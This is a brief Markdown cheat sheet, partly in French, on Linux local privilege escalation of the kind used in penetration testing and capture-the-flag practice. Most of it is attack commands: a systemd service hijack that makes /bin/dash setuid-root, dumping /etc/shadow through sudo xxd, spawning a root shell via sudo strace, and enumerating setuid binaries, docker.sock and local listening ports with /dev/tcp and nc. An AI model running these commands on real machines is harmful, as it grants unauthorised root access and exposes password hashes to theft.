# LPE Linux

## Tools 

- [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)
- [LinEnum](https://github.com/rebootuser/LinEnum)

## Systemd

```bash
echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
vi /lib/systemd/system/debug.service 
edit line : ExecStart in `/tmp/priv.sh
reboot
```

## Programms running

```bash
ps -aux | grep root
https://github.com/DominicBreuker/pspy 
```

## Services listening

```bash
netstat -latupen | grep LISTEN
netstat -nlt | awk -F : '/\<tcp\>/ {split($2,a," "); print a[1]}' | xargs -I % bash -c 'echo -ne "\033[1;33m[+]\033[m Port %:\t$(timeout 1 cat </dev/tcp/127.0.0.1/%)\n"'
netstat -nlt | grep 'tcp ' | grep -Eo "[1-9][0-9]*" | xargs -I {} sh -c "echo "" | nc -v -n -w1 127.0.0.1 {}"
```

## Docker

```bash
find / -group docker -exec ls -la {} 2>/dev/null \;
=> on cherche le docker.sock
```

## Binaries enum

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

## Hash dump

```bash
sudo xxd /etc/shadow | xxd -r
```

## Strace root

```bash
sudo strace -o /dev/null /bin/sh
```

